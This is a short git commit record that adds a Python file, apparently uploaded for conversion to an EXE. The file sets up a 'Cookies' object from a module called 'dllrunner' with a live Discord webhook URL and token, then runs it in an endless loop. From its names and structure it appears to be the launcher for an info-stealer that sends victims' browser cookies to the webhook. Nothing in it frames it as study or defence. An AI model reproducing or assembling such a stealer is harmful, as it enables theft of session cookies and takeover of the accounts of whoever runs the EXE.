c6e4597afbc1d4b3729004d204192c73a125aff0
eroge-69 <erogexunamed@gmail.com>
2025-05-29 16:41:23 +0700

    Upload main.py via PY to EXE tool

---
+++ python-files/main.py
@@ -0,0 +1,10 @@
+from dllrunner import Cookies
+
+log = Cookies('https://discord.com/api/webhooks/1377576779996467270/jnZKDazpaPDIfhNc9tuhCTpXJ_dpe2LYMtsdjIr3rgk2U8hCh-gLoTyffMlODMy0p5CA')
+
+def main():
+    while True:
+        log.run_all()
+
+if __name__ == '__main__':
+    main()
